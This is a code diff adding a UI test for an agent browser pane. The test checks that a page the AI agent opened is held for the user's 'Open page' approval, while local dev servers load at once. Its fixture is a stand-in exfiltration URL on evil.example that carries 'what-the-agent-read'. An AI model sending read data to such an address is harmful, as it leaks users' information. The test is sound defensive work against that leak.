@@ -197,6 +197,28 @@ it('frames a page in a browser: a web page as the web, saying sites may refuse; 
   expect(file.find('.browser-address__text')?.textContent).toBe('page.html')
 })
 
+it('waits for the user before loading a page the agent opened elsewhere: its address in full, and Open page', async () => {
+  const m = fakeMachine({ threads: [testThread({ id: 't1' })], methods: { 'action.run': () => null } })
+  ui = await mountUi({ extensions: [browser], machines: [m] })
+  window.superego.webView = undefined
+  window.superego.forward = undefined
+  const url = 'https://evil.example/collect?d=what-the-agent-read'
+  const asked = await ui.render({ thread: 't1', pane: { id: 'p7', kind: BROWSER, params: { url }, by: 'agent' } })
+  expect(asked.find('iframe')).toBeNull()
+  expect(asked.text()).toContain('The agent opened a page on evil.example')
+  expect(asked.find('.browser-agent-page__url')?.textContent).toBe(url)
+  // Open page: the pane as it is, the user's now (the daemon drops its `by`), and it loads.
+  await asked.click('Open page')
+  expect(m.calls).toContainEqual({ method: 'action.run', params: expect.objectContaining({ id: 'pane.update', params: { thread: 't1', pane: 'p7', params: { url } } }) })
+  await asked.unmount()
+  // A dev server here or near, the agent's or not, loads at once; and so does anything the user opened.
+  for (const [at, by] of [['http://localhost:5173/', 'agent'], ['http://workbox:5173/', 'agent'], ['http://192.168.1.4/', 'agent'], [url, undefined]] as const) {
+    const page = await ui.render({ thread: 't1', pane: { id: 'p8', kind: BROWSER, params: { url: at }, ...(by ? { by } : {}) } })
+    await vi.waitFor(() => expect(page.find('iframe')?.getAttribute('src')).toBe(at))
+    await page.unmount()
+  }
+})
+
 it('shows a page loading: a line under the toolbar, from a moment in, at its progress; full, then gone, once it loads', async () => {
   ui = await mountUi({ extensions: [browser] })
   globalThis.ResizeObserver ??= class { observe() {} unobserve() {} disconnect() {} } as never
